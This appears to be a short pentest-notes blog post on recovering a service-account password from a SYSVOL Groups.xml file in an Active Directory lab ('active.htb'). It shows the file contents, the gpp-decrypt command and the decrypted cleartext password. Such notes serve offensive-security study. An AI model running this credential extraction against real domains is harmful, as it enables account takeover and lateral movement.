---
description: >-
  SYSVOL lateral movemet abusing Groups.xml file.
title: SYSVOL (Groups.xml)              # Add title here
date: 2023-02-09 08:00:00 -0600                           # Change the date to match completion date
categories: [12 Active Directory, Lateral Movement]             # Change Templates to Writeup
tags: [active directory, lateral movement, groups.xml, sysvol share, gpp decrypt]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
If we have access to a SYSVOL file, we can extract the "Groups.xml" file and decrypt the cpassword with gpp-decrypt utility:
```bash
# Contents of Groups.xml
cat ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

# Decrypting cpassword
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```
Examples:
[Active](https://shuciran.github.io/posts/Active/#fnref:sysvol-gpp-decrypt)